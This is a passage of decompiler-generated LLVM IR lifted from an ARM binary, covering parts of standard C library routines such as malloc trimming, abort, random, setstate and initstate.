dec_label_pc_be54:                                ; preds = %dec_label_pc_be48
  store i32 %v3_be34, i32* %v2_be48, align 4
  %v0_be58 = load i32, i32* %r0.global-to-local, align 4
  %v1_be58 = load i32, i32* %r2.global-to-local, align 4
  %v2_be58 = add i32 %v1_be58, 12
  %v3_be58 = inttoptr i32 %v2_be58 to i32*
  store i32 %v0_be58, i32* %v3_be58, align 4
  %v0_be5c = load i32, i32* %ip.global-to-local, align 4
  %v1_be5c = load i32, i32* %r1.global-to-local, align 4
  %v2_be5c = add i32 %v1_be5c, %v0_be5c
  store i32 %v2_be5c, i32* %ip.global-to-local, align 4
  %v0_be6c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_be70.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_be60

dec_label_pc_be60:                                ; preds = %dec_label_pc_be10, %dec_label_pc_be54
  %v0_beec = phi i32 [ %v1_be1c, %dec_label_pc_be10 ], [ %v2_be5c, %dec_label_pc_be54 ]
  %v0_be70 = phi i32 [ %v3_be24, %dec_label_pc_be10 ], [ %v0_be70.pre, %dec_label_pc_be54 ]
  %v1_be84 = phi i32 [ %v2_be1c, %dec_label_pc_be10 ], [ %v0_be6c.pre, %dec_label_pc_be54 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_be64 = load i32, i32* @r7, align 4
  %v2_be64 = add i32 %v0_be64, 32
  %v3_be64 = inttoptr i32 %v2_be64 to i32*
  %v4_be64 = load i32, i32* %v3_be64, align 4
  store i32 %v4_be64, i32* @r2, align 4
  %v1_be68 = add i32 %v4_be64, 44
  %v2_be68 = inttoptr i32 %v1_be68 to i32*
  %v3_be68 = load i32, i32* %v2_be68, align 4
  store i32 %v3_be68, i32* %r3.global-to-local, align 4
  %v9_be6c = icmp eq i32 %v1_be84, %v3_be68
  %v1_be70 = and i32 %v0_be70, -4
  store i32 %v1_be70, i32* %r0.global-to-local, align 4
  br i1 %v9_be6c, label %dec_label_pc_beec, label %dec_label_pc_be78

dec_label_pc_be78:                                ; preds = %dec_label_pc_be60
  %v2_be78 = add i32 %v1_be84, %v1_be70
  store i32 %v2_be78, i32* %r3.global-to-local, align 4
  %v1_be7c = add i32 %v2_be78, 4
  %v2_be7c = inttoptr i32 %v1_be7c to i32*
  %v3_be7c = load i32, i32* %v2_be7c, align 4
  store i32 %v3_be7c, i32* %r3.global-to-local, align 4
  %v1_be80 = urem i32 %v3_be7c, 2
  %v2_be80 = icmp eq i32 %v1_be80, 0
  %v2_be84 = add i32 %v1_be84, 4
  %v3_be84 = inttoptr i32 %v2_be84 to i32*
  store i32 %v1_be70, i32* %v3_be84, align 4
  br i1 %v2_be80, label %dec_label_pc_be8c, label %dec_label_pc_be78.dec_label_pc_bebc_crit_edge

dec_label_pc_be78.dec_label_pc_bebc_crit_edge:    ; preds = %dec_label_pc_be78
  %v0_becc.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bebc

dec_label_pc_be8c:                                ; preds = %dec_label_pc_be78
  %v0_be8c = load i32, i32* %lr.global-to-local, align 4
  %v1_be8c = add i32 %v0_be8c, 8
  %v2_be8c = inttoptr i32 %v1_be8c to i32*
  %v3_be8c = load i32, i32* %v2_be8c, align 4
  store i32 %v3_be8c, i32* %r1.global-to-local, align 4
  %v1_be90 = add i32 %v3_be8c, 12
  %v2_be90 = inttoptr i32 %v1_be90 to i32*
  %v3_be90 = load i32, i32* %v2_be90, align 4
  store i32 %v3_be90, i32* %r3.global-to-local, align 4
  %v9_be94 = icmp eq i32 %v3_be90, %v0_be8c
  %v1_be98 = add i32 %v0_be8c, 12
  %v2_be98 = inttoptr i32 %v1_be98 to i32*
  %v3_be98 = load i32, i32* %v2_be98, align 4
  store i32 %v3_be98, i32* %r2.global-to-local, align 4
  br i1 %v9_be94, label %dec_label_pc_bea0, label %dec_label_pc_beac

dec_label_pc_bea0:                                ; preds = %dec_label_pc_be8c
  %v1_bea0 = add i32 %v3_be98, 8
  %v2_bea0 = inttoptr i32 %v1_bea0 to i32*
  %v3_bea0 = load i32, i32* %v2_bea0, align 4
  store i32 %v3_bea0, i32* %r3.global-to-local, align 4
  %v9_bea4 = icmp eq i32 %v3_bea0, %v0_be8c
  br i1 %v9_bea4, label %dec_label_pc_beb0, label %dec_label_pc_beac

dec_label_pc_beac:                                ; preds = %dec_label_pc_be8c, %dec_label_pc_be48, %dec_label_pc_be2c, %dec_label_pc_bea0
  %v0_beac = call i32 @abort()
  store i32 %v0_beac, i32* %r0.global-to-local, align 4
  %v0_beb0.pre = load i32, i32* @r1, align 4
  %v1_beb0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_beb0

dec_label_pc_beb0:                                ; preds = %dec_label_pc_bea0, %dec_label_pc_beac
  %v1_beb0 = phi i32 [ %v3_be98, %dec_label_pc_bea0 ], [ %v1_beb0.pre, %dec_label_pc_beac ]
  %v0_beb0 = phi i32 [ %v3_be8c, %dec_label_pc_bea0 ], [ %v0_beb0.pre, %dec_label_pc_beac ]
  %v2_beb0 = add i32 %v1_beb0, 8
  %v3_beb0 = inttoptr i32 %v2_beb0 to i32*
  store i32 %v0_beb0, i32* %v3_beb0, align 4
  %v0_beb4 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb4 = load i32, i32* %r1.global-to-local, align 4
  %v2_beb4 = add i32 %v1_beb4, 12
  %v3_beb4 = inttoptr i32 %v2_beb4 to i32*
  store i32 %v0_beb4, i32* %v3_beb4, align 4
  %v0_beb8 = load i32, i32* %ip.global-to-local, align 4
  %v1_beb8 = load i32, i32* %r0.global-to-local, align 4
  %v2_beb8 = add i32 %v1_beb8, %v0_beb8
  store i32 %v2_beb8, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_bebc

dec_label_pc_bebc:                                ; preds = %dec_label_pc_be78.dec_label_pc_bebc_crit_edge, %dec_label_pc_beb0
  %v0_becc = phi i32 [ %v0_becc.pre, %dec_label_pc_be78.dec_label_pc_bebc_crit_edge ], [ %v2_beb8, %dec_label_pc_beb0 ]
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_bec0 = load i32, i32* @r7, align 4
  %v2_bec0 = add i32 %v0_bec0, 32
  %v3_bec0 = inttoptr i32 %v2_bec0 to i32*
  %v4_bec0 = load i32, i32* %v3_bec0, align 4
  %v1_bec4 = add i32 %v4_bec0, 52
  store i32 %v1_bec4, i32* %r3.global-to-local, align 4
  %v1_bec8 = add i32 %v4_bec0, 60
  %v2_bec8 = inttoptr i32 %v1_bec8 to i32*
  %v3_bec8 = load i32, i32* %v2_bec8, align 4
  store i32 %v3_bec8, i32* %r1.global-to-local, align 4
  %v1_becc = or i32 %v0_becc, 1
  store i32 %v1_becc, i32* @r2, align 4
  %v1_bed0 = load i32, i32* %r4.global-to-local, align 4
  %v2_bed0 = add i32 %v1_bed0, 12
  %v3_bed0 = inttoptr i32 %v2_bed0 to i32*
  store i32 %v1_bec4, i32* %v3_bed0, align 4
  %v0_bed4 = load i32, i32* %r1.global-to-local, align 4
  %v1_bed4 = load i32, i32* %r4.global-to-local, align 4
  %v2_bed4 = add i32 %v1_bed4, 8
  %v3_bed4 = inttoptr i32 %v2_bed4 to i32*
  store i32 %v0_bed4, i32* %v3_bed4, align 4
  %v0_bed8 = load i32, i32* @r2, align 4
  %v1_bed8 = load i32, i32* %r4.global-to-local, align 4
  %v2_bed8 = add i32 %v1_bed8, 4
  %v3_bed8 = inttoptr i32 %v2_bed8 to i32*
  store i32 %v0_bed8, i32* %v3_bed8, align 4
  %v0_bedc = load i32, i32* %ip.global-to-local, align 4
  %v1_bedc = load i32, i32* %r4.global-to-local, align 4
  %v3_bedc = add i32 %v1_bedc, %v0_bedc
  %v4_bedc = inttoptr i32 %v3_bedc to i32*
  store i32 %v0_bedc, i32* %v4_bedc, align 4
  %v0_bee0 = load i32, i32* %r4.global-to-local, align 4
  %v1_bee0 = load i32, i32* %r1.global-to-local, align 4
  %v2_bee0 = add i32 %v1_bee0, 12
  %v3_bee0 = inttoptr i32 %v2_bee0 to i32*
  store i32 %v0_bee0, i32* %v3_bee0, align 4
  %v0_bee4 = load i32, i32* %r4.global-to-local, align 4
  %v1_bee4 = load i32, i32* %r3.global-to-local, align 4
  %v2_bee4 = add i32 %v1_bee4, 8
  %v3_bee4 = inttoptr i32 %v2_bee4 to i32*
  store i32 %v0_bee4, i32* %v3_bee4, align 4
  br label %dec_label_pc_befc

dec_label_pc_beec:                                ; preds = %dec_label_pc_be60
  %v2_beec = add i32 %v1_be70, %v0_beec
  store i32 %v2_beec, i32* %ip.global-to-local, align 4
  %v1_bef0 = or i32 %v2_beec, 1
  store i32 %v1_bef0, i32* %r3.global-to-local, align 4
  %v0_bef4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_bef4, i32* %v2_be68, align 4
  %v0_bef8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bef8 = load i32, i32* %r4.global-to-local, align 4
  %v2_bef8 = add i32 %v1_bef8, 4
  %v3_bef8 = inttoptr i32 %v2_bef8 to i32*
  store i32 %v0_bef8, i32* %v3_bef8, align 4
  br label %dec_label_pc_befc

dec_label_pc_befc:                                ; preds = %dec_label_pc_bebc, %dec_label_pc_beec
  %v0_befc = load i32, i32* %ip.global-to-local, align 4
  %v3_bf00 = icmp ult i32 %v0_befc, 131070
  br i1 %v3_bf00, label %dec_label_pc_bf6c, label %dec_label_pc_bf04

dec_label_pc_bf04:                                ; preds = %dec_label_pc_befc
  store i32 32, i32* %r3.global-to-local, align 4
  %v0_bf08 = load i32, i32* @r7, align 4
  %v2_bf08 = add i32 %v0_bf08, 32
  %v3_bf08 = inttoptr i32 %v2_bf08 to i32*
  %v4_bf08 = load i32, i32* %v3_bf08, align 4
  store i32 %v4_bf08, i32* @r4, align 4
  %v1_bf0c = inttoptr i32 %v4_bf08 to i32*
  %v2_bf0c = load i32, i32* %v1_bf0c, align 4
  store i32 %v2_bf0c, i32* %r3.global-to-local, align 4
  %v1_bf10 = and i32 %v2_bf0c, 2
  %v2_bf10 = icmp eq i32 %v1_bf10, 0
  br i1 %v2_bf10, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_bf04
  store i32 %v4_bf08, i32* %r0.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_bf04, %bb
  %v1_bf18 = xor i1 %v2_bf10, true
  call void @__pseudo_cond_branch(i1 %v1_bf18, i32 ptrtoint (i32* @global_var_bbbc.103 to i32))
  %v0_bf1c = load i32, i32* @r4, align 4
  %v1_bf1c = add i32 %v0_bf1c, 44
  %v2_bf1c = inttoptr i32 %v1_bf1c to i32*
  %v3_bf1c = load i32, i32* %v2_bf1c, align 4
  store i32 %v3_bf1c, i32* %r3.global-to-local, align 4
  %v1_bf20 = add i32 %v3_bf1c, 4
  %v2_bf20 = inttoptr i32 %v1_bf20 to i32*
  %v3_bf20 = load i32, i32* %v2_bf20, align 4
  store i32 %v3_bf20, i32* %r3.global-to-local, align 4
  %v1_bf24 = add i32 %v0_bf1c, 836
  %v2_bf24 = inttoptr i32 %v1_bf24 to i32*
  %v3_bf24 = load i32, i32* %v2_bf24, align 4
  store i32 %v3_bf24, i32* @r2, align 4
  %v1_bf28 = and i32 %v3_bf20, -4
  store i32 %v1_bf28, i32* %r3.global-to-local, align 4
  %v3_bf2c = icmp ult i32 %v1_bf28, %v3_bf24
  br i1 %v3_bf2c, label %dec_label_pc_bf6c, label %dec_label_pc_bf34

dec_label_pc_bf34:                                ; preds = %bb17
  store i32 %v0_bf1c, i32* %r1.global-to-local, align 4
  %v1_bf38 = add i32 %v0_bf1c, 840
  %v2_bf38 = inttoptr i32 %v1_bf38 to i32*
  %v3_bf38 = load i32, i32* %v2_bf38, align 4
  store i32 %v3_bf38, i32* %r0.global-to-local, align 4
  %v2_bf3c = call i32 @__malloc_trim(i32 %v3_bf38, i32 %v0_bf1c)
  store i32 %v2_bf3c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf6c

dec_label_pc_bf44:                                ; preds = %dec_label_pc_be08
  %v2_bf44 = inttoptr i32 %v1_bdd8 to i32*
  %v3_bf44 = load i32, i32* %v2_bf44, align 4
  store i32 %v3_bf44, i32* %r0.global-to-local, align 4
  %v1_bf48 = add i32 %v4_bdc8, 848
  %v2_bf48 = inttoptr i32 %v1_bf48 to i32*
  %v3_bf48 = load i32, i32* %v2_bf48, align 4
  store i32 %v3_bf48, i32* %r2.global-to-local, align 4
  %v1_bf4c = add i32 %v4_bdc8, 868
  %v2_bf4c = inttoptr i32 %v1_bf4c to i32*
  %v3_bf4c = load i32, i32* %v2_bf4c, align 4
  %v2_bf50 = add i32 %v3_bf44, %v1_bdd4
  store i32 %v2_bf50, i32* %r1.global-to-local, align 4
  %v1_bf54 = add i32 %v3_bf48, -1
  store i32 %v1_bf54, i32* @r2, align 4
  %v2_bf58 = sub i32 %v3_bf4c, %v2_bf50
  store i32 %v2_bf58, i32* %r3.global-to-local, align 4
  store i32 %v2_bf58, i32* %v2_bf4c, align 4
  %v1_bf60 = load i32, i32* @lr, align 4
  %v2_bf60 = add i32 %v1_bf60, 848
  %v3_bf60 = inttoptr i32 %v2_bf60 to i32*
  store i32 %v1_bf54, i32* %v3_bf60, align 4
  %v0_bf64 = load i32, i32* %r0.global-to-local, align 4
  %v1_bf64 = load i32, i32* @r5, align 4
  %v2_bf64 = sub i32 %v1_bf64, %v0_bf64
  store i32 %v2_bf64, i32* %r0.global-to-local, align 4
  %v4_bf68 = call i32 @munmap(i32 %v2_bf64, i32 %v2_bf50, i32 %v1_bf54, i32 %v2_bf58)
  store i32 %v4_bf68, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bf6c

dec_label_pc_bf6c:                                ; preds = %bb17, %dec_label_pc_befc, %dec_label_pc_bf34, %dec_label_pc_bde8, %dec_label_pc_bf44
  store i32 %v2_bd7c, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_bf78 = load i32, i32* @r7, align 4
  %v2_bf78 = add i32 %v0_bf78, 24
  %v3_bf78 = inttoptr i32 %v2_bf78 to i32*
  %v4_bf78 = load i32, i32* %v3_bf78, align 4
  store i32 %v4_bf78, i32* @ip, align 4
  store i32 49028, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_bf78)
  br label %dec_label_pc_bf84

dec_label_pc_bf84:                                ; preds = %entry, %dec_label_pc_bf6c
  store i32 %v3_bd70, i32* @r4, align 4
  store i32 %v6_bd70, i32* @r5, align 4
  store i32 %v9_bd70, i32* @r6, align 4
  store i32 %v12_bd70, i32* @r7, align 4
  store i32 %v18_bd70, i32* @lr, align 4
  ret i32 %v2_bd7c

; uselistorder directives
  uselistorder i32 %v0_bf1c, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_bedc, { 1, 0 }
  uselistorder i32 %v1_be1c, { 1, 0 }
  uselistorder i32 %v0_be1c, { 1, 0 }
  uselistorder i32 %v3_bdf0, { 1, 0 }
  uselistorder i32 %v1_bdd4, { 1, 0, 2 }
  uselistorder i32 %v2_bdd0, { 1, 2, 0, 3 }
  uselistorder i32 %v4_bdc8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_bd78, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 0, 4, 1, 2, 3, 7, 5, 6, 13, 14, 8, 9, 10, 12, 11 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 4, 0, 5, 1, 6, 3, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder label %dec_label_pc_bf84, { 1, 0 }
  uselistorder label %dec_label_pc_bf6c, { 4, 2, 0, 1, 3 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %dec_label_pc_befc, { 1, 0 }
  uselistorder label %dec_label_pc_bebc, { 1, 0 }
  uselistorder label %dec_label_pc_beb0, { 1, 0 }
  uselistorder label %dec_label_pc_beac, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_be60, { 1, 0 }
}

define i32 @function_bf94(i32 %arg1) local_unnamed_addr {
dec_label_pc_bf94:
  %v0_bf94 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bf94, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_bf94
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_bf94, %bb
  %v10_bfa8 = phi i32 [ %arg1, %dec_label_pc_bf94 ], [ 0, %bb ]
  ret i32 %v10_bfa8

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v3_bfac = load i32, i32* @r4, align 4
  store i32 %v3_bfac, i32* %stack_var_-12, align 4
  %v6_bfac = load i32, i32* @r5, align 4
  %v4_bfbc = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 32) to i32*), align 4
  store i32 %v4_bfbc, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v4_bfbc, i32* @r0, align 4
  %v0_bfcc = call i32 @__malloc_consolidate()
  %v0_bfd0 = load i32, i32* @r4, align 4
  %v0_bfd4 = load i32, i32* @r5, align 4
  %v2_bfdc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_bfdc, i32* @r4, align 4
  store i32 %v6_bfac, i32* @r5, align 4
  %v2_bfe0 = call i32 @__malloc_trim(i32 %v0_bfd0, i32 %v0_bfd4)
  %v0_bfe4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_bfe4, label %bb, label %.thread

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v4_bfe8 = phi i32 [ %v2_bfe0, %entry ], [ 0, %bb ]
  ret i32 %v4_bfe8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__malloc_trim, { 1, 0 }
  uselistorder i32 ()* @__malloc_consolidate, { 3, 2, 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r5, align 4
  %v4_c004 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 16) to i32*), align 4
  store i32 49168, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_c004)
  %v2_c020 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v6_c02c = call i32 @__GI_sigprocmask(i32 1, i32 %v2_c020, i32 0, i32 32, i32 32, i32 0)
  %v0_c034 = load i32, i32* @r5, align 4
  %v2_c034 = add i32 %v0_c034, 1272
  %v3_c034 = inttoptr i32 %v2_c034 to i32*
  %v4_c034 = load i32, i32* %v3_c034, align 4
  %v2_c038 = icmp eq i32 %v4_c034, 0
  br i1 %v2_c038, label %dec_label_pc_c040, label %dec_label_pc_c080

dec_label_pc_c040:                                ; preds = %entry
  store i32 1, i32* %v3_c034, align 4
  br label %dec_label_pc_c048

dec_label_pc_c048:                                ; preds = %dec_label_pc_c090, %dec_label_pc_c040
  %v0_c04c = load i32, i32* @r5, align 4
  %v2_c04c = add i32 %v0_c04c, 176
  store i32 %v2_c04c, i32* @r4, align 4
  %v2_c058 = add i32 %v0_c04c, 36
  %v3_c058 = inttoptr i32 %v2_c058 to i32*
  %v4_c058 = load i32, i32* %v3_c058, align 4
  call void @__pseudo_branch(i32 %v4_c058)
  %v1_c068 = call i32 @__GI_raise(i32 6)
  %v0_c074 = load i32, i32* @r5, align 4
  %v2_c074 = add i32 %v0_c074, 16
  %v3_c074 = inttoptr i32 %v2_c074 to i32*
  %v4_c074 = load i32, i32* %v3_c074, align 4
  store i32 49280, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_c074)
  %v0_c084.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_c080

dec_label_pc_c080:                                ; preds = %entry, %dec_label_pc_c048
  %v1_c098 = phi i32 [ %v0_c034, %entry ], [ %v0_c084.pre, %dec_label_pc_c048 ]
  %v2_c084 = add i32 %v1_c098, 1272
  %v3_c084 = inttoptr i32 %v2_c084 to i32*
  %v4_c084 = load i32, i32* %v3_c084, align 4
  %v7_c088 = icmp eq i32 %v4_c084, 1
  br i1 %v7_c088, label %dec_label_pc_c090, label %dec_label_pc_c0cc

dec_label_pc_c090:                                ; preds = %dec_label_pc_c080
  %v2_c090 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_c090, i32* @r4, align 4
  store i32 2, i32* %v3_c084, align 4
  store i32 20, i32* @r2, align 4
  %v2_c0a8 = bitcast i32* %stack_var_-28 to i8*
  %v3_c0a8 = call i32 @__GI_memset(i8* %v2_c0a8, i32 0)
  %v3_c0c4 = call i32 @__libc_sigaction(i32 6, i32 %v2_c090, i32 0)
  br label %dec_label_pc_c048

dec_label_pc_c0cc:                                ; preds = %dec_label_pc_c080
  %v7_c0cc = icmp eq i32 %v4_c084, 2
  br i1 %v7_c0cc, label %dec_label_pc_c0d4, label %dec_label_pc_c0e0

dec_label_pc_c0d4:                                ; preds = %dec_label_pc_c0cc
  store i32 3, i32* %v3_c084, align 4
  %v0_c0dc = call i32 @abort()
  %v0_c0e0.pre = load i32, i32* @r5, align 4
  %v1_c0e0.pre = load i32, i32* @r2, align 4
  br label %dec_label_pc_c0e0

dec_label_pc_c0e0:                                ; preds = %dec_label_pc_c0cc, %dec_label_pc_c0d4
  %v3_c0ec = phi i32 [ 1272, %dec_label_pc_c0cc ], [ %v1_c0e0.pre, %dec_label_pc_c0d4 ]
  %v2_c0ec = phi i32 [ %v1_c098, %dec_label_pc_c0cc ], [ %v0_c0e0.pre, %dec_label_pc_c0d4 ]
  %v2_c0e0 = add i32 %v2_c0ec, %v3_c0ec
  %v3_c0e0 = inttoptr i32 %v2_c0e0 to i32*
  %v4_c0e0 = load i32, i32* %v3_c0e0, align 4
  %v7_c0e4 = icmp eq i32 %v4_c0e0, 3
  br i1 %v7_c0e4, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_c0e0
  store i32 4, i32* %v3_c0e0, align 4
  br label %.thread3

.thread3:                                         ; preds = %dec_label_pc_c0e0, %bb
  call void @__pseudo_cond_branch(i1 %v7_c0e4, i32 ptrtoint (i32* @global_var_aa84.112 to i32))
  br label %dec_label_pc_c0f8

dec_label_pc_c0f8:                                ; preds = %dec_label_pc_c0f8, %.thread3
  %v0_c0f8 = call i32 @abort()
  br label %dec_label_pc_c0f8

; uselistorder directives
  uselistorder i32* %v3_c084, { 1, 0, 2 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_c0e0, { 1, 0 }
  uselistorder label %dec_label_pc_c080, { 1, 0 }
}

define i32 @function_c104(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_c104:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_c104 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c104, label %.thread1, label %.thread2

.thread1:                                         ; preds = %dec_label_pc_c104
  %v2_c104 = trunc i32 %tmp to i16
  store i16 %v2_c104, i16* %arg1, align 2
  call void @llvm.trap()
  unreachable

.thread2:                                         ; preds = %dec_label_pc_c104
  ret i32 %tmp
}

define i32 @random(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  %v4_c144 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c144)
  %v0_c158 = load i32, i32* @r4, align 4
  %v2_c158 = add i32 %v0_c158, 16
  %v3_c158 = inttoptr i32 %v2_c158 to i32*
  %v4_c158 = load i32, i32* %v3_c158, align 4
  call void @__pseudo_branch(i32 %v4_c158)
  %v2_c168 = ptrtoint i32* %stack_var_-20 to i32
  %v0_c16c = load i32, i32* @r4, align 4
  %v2_c16c = add i32 %v0_c16c, 352
  %v2_c170 = inttoptr i32 %v2_c16c to i32*
  %v3_c170 = call i32 @__GI_random_r(i32* %v2_c170, i32 %v2_c168)
  %v0_c180 = load i32, i32* @r4, align 4
  %v2_c180 = add i32 %v0_c180, 24
  %v3_c180 = inttoptr i32 %v2_c180 to i32*
  %v4_c180 = load i32, i32* %v3_c180, align 4
  call void @__pseudo_branch(i32 %v4_c180)
  %v3_c18c = load i32, i32* %stack_var_-20, align 4
  ret i32 %v3_c18c
}

define i32 @function_c1a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_c1a0:
  %v0_c1a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c1a0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c1a0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c1a0, %bb
  %v10_c1b4 = phi i32 [ %arg1, %dec_label_pc_c1a0 ], [ 0, %bb ]
  ret i32 %v10_c1b4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @setstate(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r6, align 4
  store i32 %arg1, i32* @r5, align 4
  %v4_c1e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c1e8)
  %v0_c1fc = load i32, i32* @r6, align 4
  %v2_c1fc = add i32 %v0_c1fc, 16
  %v3_c1fc = inttoptr i32 %v2_c1fc to i32*
  %v4_c1fc = load i32, i32* %v3_c1fc, align 4
  call void @__pseudo_branch(i32 %v4_c1fc)
  %v0_c20c = load i32, i32* @r6, align 4
  %v2_c20c = add i32 %v0_c20c, 352
  %v0_c214 = load i32, i32* @r5, align 4
  %v1_c218 = add i32 %v0_c20c, 360
  %v2_c218 = inttoptr i32 %v1_c218 to i32*
  %v3_c218 = load i32, i32* %v2_c218, align 4
  store i32 %v3_c218, i32* @r4, align 4
  %v2_c21c = inttoptr i32 %v2_c20c to i32*
  %v3_c21c = call i32 @setstate_r(i32 %v0_c214, i32* %v2_c21c)
  %v1_c224 = icmp slt i32 %v3_c21c, 0
  %v3_c234 = load i32, i32* @r4, align 4
  %v4_c234 = add i32 %v3_c234, -4
  %storemerge = select i1 %v1_c224, i32 0, i32 %v4_c234
  %v0_c238 = load i32, i32* @r6, align 4
  %v2_c238 = add i32 %v0_c238, 24
  %v3_c238 = inttoptr i32 %v2_c238 to i32*
  %v4_c238 = load i32, i32* %v3_c238, align 4
  call void @__pseudo_branch(i32 %v4_c238)
  ret i32 %storemerge
}

define i32 @function_c258(i32 %arg1) local_unnamed_addr {
dec_label_pc_c258:
  %v0_c258 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_c258, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_c258
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_c258, %bb
  %v10_c26c = phi i32 [ %arg1, %dec_label_pc_c258 ], [ 0, %bb ]
  ret i32 %v10_c26c

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @sl, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r7, align 4
  %v4_c2a8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1f010.69 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_c2a8)
  %v0_c2bc = load i32, i32* @r4, align 4
  %v2_c2bc = add i32 %v0_c2bc, 16
  %v3_c2bc = inttoptr i32 %v2_c2bc to i32*
  %v4_c2bc = load i32, i32* %v3_c2bc, align 4
  call void @__pseudo_branch(i32 %v4_c2bc)
  %v0_c2cc = load i32, i32* @r6, align 4
  %v0_c2d0 = load i32, i32* @r4, align 4
  %v2_c2d0 = add i32 %v0_c2d0, 352
  %v0_c2d4 = load i32, i32* @r7, align 4
  %v0_c2d8 = load i32, i32* @sl, align 4
  store i32 %v0_c2d8, i32* @r0, align 4
  %v1_c2dc = add i32 %v0_c2d0, 360
  %v2_c2dc = inttoptr i32 %v1_c2dc to i32*
  %v3_c2dc = load i32, i32* %v2_c2dc, align 4
  store i32 %v3_c2dc, i32* @r5, align 4
  %v4_c2e0 = inttoptr i32 %v0_c2d8 to i32*
  %v5_c2e0 = call i32 @__GI_initstate_r(i32* %v4_c2e0, i32 %v0_c2cc, i32 %v0_c2d4, i32 %v2_c2d0)
  %v0_c2f0 = load i32, i32* @r4, align 4
  %v2_c2f0 = add i32 %v0_c2f0, 24
  %v3_c2f0 = inttoptr i32 %v2_c2f0 to i32*
  %v4_c2f0 = load i32, i32* %v3_c2f0, align 4
  call void @__pseudo_branch(i32 %v4_c2f0)
  %v0_c2fc = load i32, i32* @r5, align 4
  %v1_c2fc = add i32 %v0_c2fc, -4
  ret i32 %v1_c2fc
}

define i32 @function_c318(i32 %arg1) local_unnamed_addr {
dec_label_pc_c318:
  %v0_c318 = load i1, i1* @cpsr_z, align 1
